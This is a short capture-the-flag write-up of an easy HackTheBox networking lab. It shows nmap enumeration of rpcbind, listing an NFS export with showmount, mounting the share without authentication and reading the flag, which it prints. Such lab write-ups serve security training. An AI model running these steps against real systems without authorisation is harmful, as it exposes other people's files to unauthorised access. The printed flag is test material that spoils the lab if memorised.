# Day20 - dns_footprinting

- **Platform**: HackTheBox  
- **Category**: Networking  
- **Difficulty**: Easy  
- **Date**: 2025-05-20  
- **Tools Used**: dig, dnsenum, nmap, showmount  

---

## Summary
The challenge involved DNS and NFS enumeration. After identifying an NFS service through `rpcbind`, I used `showmount` to find the exported share `/nfsshare`, mounted it locally, and retrieved the flag.

---

## Enumeration
- Ran Nmap to identify RPC services:
  ```bash
  sudo nmap -p111 -sV -sC 10.129.42.178
  ```
  - Port 111 open (rpcbind).  
  - NSE `rpcinfo` revealed an NFS export (program 100003).  

- Listed available NFS exports:
  ```bash
  showmount -e 10.129.42.178
  ```
  - Export list:
    ```
    /nfsshare 10.129.0.0/16
    ```

---

## Exploitation
1. Created a local mount point:
   ```bash
   mkdir -p ./target-NFS
   ```

2. Mounted the export with `nolock` option:
   ```bash
   sudo mount -t nfs 10.129.42.178:/nfsshare ./target-NFS/ -o nolock
   ```

3. Retrieved the flag:
   ```bash
   ls ./target-NFS/
   # flag.txt

   cat ./target-NFS/flag.txt
   # HTB{nfs_exposed_flag_txt}
   ```

---

## Lessons Learned
- Always enumerate RPC services with `rpcinfo` and `showmount` after detecting rpcbind.  
- The `nolock` option is useful when lock daemons are unavailable.  
- NFS misconfigurations often expose sensitive files to unauthenticated users.  
- Quick wins: insecure NFS shares can lead directly to flag retrieval without further exploitation.  
